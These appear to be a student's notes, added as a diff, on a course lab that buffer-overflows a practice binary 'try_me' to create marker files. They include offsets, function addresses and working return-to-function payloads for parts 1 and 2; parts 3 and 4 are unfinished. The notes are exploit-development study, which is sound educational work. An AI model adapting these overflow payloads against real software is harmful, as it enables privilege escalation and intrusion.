@@ -1,0 +1,131 @@
+lab 3
+
+part1
+buffer overflow the program to create the file "uid_[uid]_crack" in the /home/admin/ directory.
+
+08048e72 <log_result>
+
+part2
+buffer overflow the program to create the file "uid_[uid]_crack_advanced" in the /home/admin/ directory.
+
+08048ea0 <log_result_advanced>
+
+part3
+Create a uid_[uid]_crack_super file in the /home/admin/ directory.
+
+part4
+Create a shell with the privilege of the admin group (verified by TA in lab)
+
+------------------------------------
+
+more than 24 bytes of input will cause segfault
+
+./try_me aaaaaaaaaaaaaaaaaaaaaaaa[here]
+
+33 bytes will overwrite eip
+the section with bbbb will overwrite eip
+
+./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb")"
+
+------------------------------------
+
+PART 1 - (done)
+
+target the log_result function
+
+address of log_result
+08048e72
+\x72\x8e\x04\x08
+
+need to do "offset + function address"
+
+running the executable on input generates file, but causes segfault
+
+./try_me "$(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08")"
+
+./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08"')"
+
+dmesg | tail -1
+
+[598993.571679] try_me[22715]: segfault at ffffd800 ip 00000000ffffd800 sp 00000000ffffd654 error 15
+
+fix segfault to successful program termination
+
+need to do "offset + function address + dummy return address"
+
+append return address to get successful exit after create file
+
+look for exit calls in objdump
+
+ 804915d:       e8 be 56 00 00          call   804e820 <exit>
+
+address of where call goes to
+\x20\xe8\x04\x08
+
+append after the exit call
+
+./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x72\x8e\x04\x08\x20\xe8\x04\x08"')"
+
+------------------------------------
+
+PART 2 (done)
+
+target the log_result_advanced function
+
+address of log_result_advanced
+08048ea0
+\xa0\x8e\x04\x08
+
+also this checks if is parameter is 0xefbeadde
+which is little endian "deadbeef" and needs to get put onto stack
+\xde\xad\xbe\xef
+
+need to do "offset + function address + dummy return address + arguments"
+
+./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08bbbb\xde\xad\xbe\xef"')"
+
+running the executable on input generates file, but causes segfault
+
+this is because of return address is "bbbb" which is 0x62626262
+
+dmesg | tail -1
+
+[23527.547142] try_me[5682]: segfault at 62626262 ip 0000000062626262 sp 00000000fffde674 error 14
+
+fix segfault to successful program termination
+
+look for exit calls in objdump
+
+ 804915d:       e8 be 56 00 00          call   804e820 <exit>
+
+address of where call goes to
+\x20\xe8\x04\x08
+
+replace "bbbb" with address to get successful exit after create file
+
+./try_me "$(python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0\x8e\x04\x08\x20\xe8\x04\x08\xde\xad\xbe\xef"')"
+
+------------------------------------
+
+PART3
+
+target the log_result function
+
+probably want to overwrite the "char filename[100]" since is global buffer
+
+The C library function int sprintf(char *str, const char *format, ...) sends formatted output to a string pointed to, by str
+
+target the sprintf in main
+
+8048f3a:       e8 f1 62 00 00          call   804f230 <_IO_sprintf>
+
+
+use the part 1 but target sprintf to write to buffer then goto the log_result function ?
+
+
+
+------------------------------------
+
+PART4
+
+------------------------------------
